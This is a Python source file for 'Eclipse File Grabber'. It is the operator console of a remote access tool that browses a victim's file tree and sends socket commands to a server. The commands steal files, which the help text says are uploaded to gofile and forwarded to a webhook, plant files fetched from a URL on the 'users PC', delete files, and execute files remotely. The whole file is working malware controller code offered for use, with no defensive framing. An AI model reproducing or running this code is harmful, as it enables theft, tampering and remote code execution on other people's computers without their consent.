# Proudly made by Alderite - https://github.com/alderite
# Eclipse File Grabber is under the GNU General Public License v3.

import socket
from threading import Thread

import json
import time

__serverIP__ = ''  #IP Address of host
__PORT__ = ""  # leave this blank if u don't know what it means


class Util(object):
    def __init__(this):
        this.host = __serverIP__
        if __PORT__ == "":
            this.port = 5475
        else:
            this.port = __PORT__

    def client(this):
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        client_socket.connect((this.host, this.port))
        return client_socket

    def send(this, msg):
        this.client().send(msg.encode('utf-8'))

    def format(this, path, name=None):
        formatted = ""
        for item in path:
            if item == "":
                pass
            else:
                formatted += f'{item}\\'
        formatted += name
        return formatted


class Modules(Util):
    def __init__(this):
        super().__init__()

    def download(this, path, name):

        this.send(f'grab|{this.format(path, name)}')

    def inject(this, path, url):
        this.send(f'inject|{this.format(path)}|{url}')

    def delete(this, path, name):
        this.send(f'delete|{this.format(path, name)}')

    def remoteExecute(this, path, name):
        this.send(f'execute|{this.format(path, name)}')

    def update(this):
        this.send('update|')

    def browse_json(this, data, path=[]):
        if isinstance(data, dict):
            print(f'Current directory: {"/".join(path)}/')

            print("Folders in directory:")
            for dir in data:
                if isinstance(data[dir], dict):  # check if value is a dictionary (representing a folder)
                    print(f'/{dir}/')

            print("\nFiles in directory:")
            try:
                for dir in data[""]:
                    size = data[""][dir].split(',')[1]
                    print(f'{dir} [{size}]')
            except:
                pass
            for dir in data:
                if isinstance(data[dir], str):  # check if value is a string (representing a file)
                    size = data[dir].split(',')[1]
                    print(f'{dir} [{size}]')
            print()

            while True:
                dir = input(f'Enter a directory to browse (or h for help): ')
                time.sleep(0.4)
                if data[dir].split(',')[0] == 'file':
                    print('cannot browse a file. Want to download it? Download [FILE/DIRECTORY]')
                if dir in data:
                    this.browse_json(data[dir], path=path + [dir])
                elif dir.lower() == 'h':
                    print(
                        'BROWSING:\n'
                        '"q": quits file browser '
                        '\n"..": goes up 1 directory '
                        '\n"../": goes up to top level directory'

                        '\n\nMANAGEMENT:'
                        '\n"Download [FILE/DIRECTORY]": uploads file/directory to gofile and sends it to a webhook'
                        '\n"Update": Updates data'
                        '\n"Inject [FILE] URL]:": Injects a file to a specified path on users pc'
                        '\n"Delete [PATH]": Deletes a in a directory/file'
                        '\n"Remote Execute [PATH]": "Executes a file on users PC"'
                        
                        '\n\nSETTINGS:'
                        '\n"Uninstall": "Uninstalls EclipseFileManager on users PC"')
                elif dir.lower() == 'q':
                    return
                elif dir == '..':
                    if len(path) > 0:
                        parent_dir = path[-1]
                        parent_data = data
                        for dir in path[:-1]:
                            parent_data = parent_data[dir]
                        this.browse_json(parent_data, path=path[:-1])
                    else:
                        print('At top level')
                elif dir == '../':
                    if len(path) > 0:
                        this.browse_json(data)
                elif dir.lower().startswith('download') and dir.split(" ", 1)[1] in data:
                    this.download(path, dir.split(" ", 1)[1])  # dir.split(" ", 1)[1] is the path
                    time.sleep(5)
                    this.browse_json(data, path=path[:])

                elif dir.lower().startswith('inject'):
                    this.inject(path, dir.split(" ", 1)[1])
                    this.browse_json(data, path=path[:])

                elif dir.lower().startswith('delete') and dir.split(" ", 1)[1] in data:
                    this.delete(path, dir.split(" ", 1)[1])
                    this.browse_json(data, path=path[:])

                elif dir.lower().startswith('remote execute') and dir.split(" ", 2)[1] in data:
                    this.remoteExecute(path, dir.split(" ", 1)[1])
                    this.browse_json(data, path=path[:])

                elif dir.lower() == 'update':
                    this.update()

                else:
                    print('Invalid command/directory')


if __name__ == "__main__":
    try:
        f = open('file_tree.json', 'r')
        f = json.load(f)
        Modules().browse_json(f)
    except FileNotFoundError:
        print("Could not find file_tree.json")
